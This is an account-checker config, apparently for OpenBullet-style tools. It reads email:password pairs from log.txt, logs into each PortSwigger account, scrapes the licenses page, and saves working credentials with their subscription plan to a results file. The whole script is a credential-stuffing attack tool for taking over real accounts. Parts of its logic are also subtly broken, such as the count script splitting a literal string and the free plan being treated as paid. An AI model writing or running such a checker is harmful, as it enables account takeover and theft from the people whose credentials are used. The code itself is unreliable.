## PortSwigger Subscription Extraction
## Reads accounts from log.txt and extracts subscription information
## Processes all accounts and outputs paid subscriptions

FileReadLines "log.txt" -> VAR "accounts"
PRINT "Loaded accounts" White

## Create label for loop iteration
#PROCESS_ACCOUNT

## Get total account count using JavaScript
BEGIN SCRIPT Jint
  var count = "accounts".split('\n').length;
  return Math.max(0, count - 1);
END SCRIPT -> VARS "totalAccounts"

## Initialize counter and results storage
SET VAR "accountIndex" "0" Integer
SET VAR "successCount" "0" Integer

## Initialize results file
FileWrite "Configs\extraction_results.txt" "email:password:plan"

## Process each account
IF $"<accountIndex>" LessThan $"<accounts[*]>"
  ## Extract account credentials
  SET VAR "account" $"<accounts[<accountIndex>]>"
  Split $"<account>" ":" -> VAR "creds"
  SET VAR "email" $"<creds[0]>"
  SET VAR "password" $"<creds[1]>"

  PRINT "[<accountIndex>] Processing: <email>" White

  ## Step 1: GET login page
  HttpRequest GET "https://login.portswigger.net/u/login" AutoRedirect=True
  SET VAR "loginPageRes" $"<SOURCE>"

  ## Step 2: POST login credentials
  HttpRequest POST "https://login.portswigger.net/u/login" AutoRedirect=True
    CONTENT "username=<email>&password=<password>&action=default"
    CONTENTTYPE "application/x-www-form-urlencoded"
  SET VAR "loginRes" $"<SOURCE>"

  ## Step 3: GET licenses page
  HttpRequest GET "https://portswigger.net/users/youraccount/licenses" AutoRedirect=True
  SET VAR "licensesRes" $"<SOURCE>"

  ## Extract subscription plan
  SET VAR "plan" ""

  IF $"<licensesRes>" Contains "Professional"
    SET VAR "plan" "Professional"
  ELSE
    IF $"<licensesRes>" Contains "Community"
      SET VAR "plan" "Community"
    ELSE
      IF $"<licensesRes>" Contains "Enterprise"
        SET VAR "plan" "Enterprise"
      ENDIF
    ENDIF
  ENDIF

  ## Write result if paid subscription found
  IF $"<plan>" NotEqualTo ""
    FileAppendLines "Configs\extraction_results.txt"
      "<email>:<password>:<plan>"
    SUM $"<successCount>" -> VAR "successCount"
    PRINT "✓ <email> - <plan>" Green
  ELSE
    PRINT "✗ <email> - no paid plan" Yellow
  ENDIF

  ## Increment counter
  SUM $"<accountIndex>" -> VAR "accountIndex"

  ## Add delay between requests
  Delay 500

  ## Jump back to loop if more accounts remain
  IF $"<accountIndex>" LessThan $"<accounts[*]>"
    JUMP #PROCESS_ACCOUNT
  ENDIF

ENDIF

PRINT "Done: <successCount> paid accounts extracted" Green
